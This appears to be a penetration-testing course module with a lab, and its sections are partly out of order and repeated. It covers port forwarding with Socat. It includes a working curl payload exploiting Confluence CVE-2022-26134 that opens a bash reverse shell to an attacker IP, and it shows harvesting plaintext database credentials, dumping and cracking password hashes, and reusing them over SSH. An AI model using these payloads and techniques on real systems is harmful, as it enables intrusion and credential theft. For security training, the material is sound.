PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

